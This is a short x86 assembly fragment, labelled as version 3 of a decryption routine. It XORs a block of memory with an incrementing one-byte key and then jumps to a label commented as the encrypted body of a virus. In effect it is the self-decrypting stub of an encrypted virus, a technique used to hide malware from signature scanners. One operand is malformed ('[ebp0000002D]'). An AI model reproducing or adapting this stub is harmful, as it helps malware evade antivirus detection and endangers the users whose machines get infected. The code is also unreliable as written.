; decrpytion version_3


mov ebp,00405000h  ;choose start point
mov ecx,550h       ;baits
lea esi,[ebp+0000002E]   ;Start offset
add ecx,[ebp+00000029]
mov al,[ebp0000002D]                  ;take first key

Decrypt:
nop
nop
xor [esi],al
inc esi
nop
inc al
dec ecx
jnz Decrypt
jmp Start

Start:
;encrypted/decrypted body of virus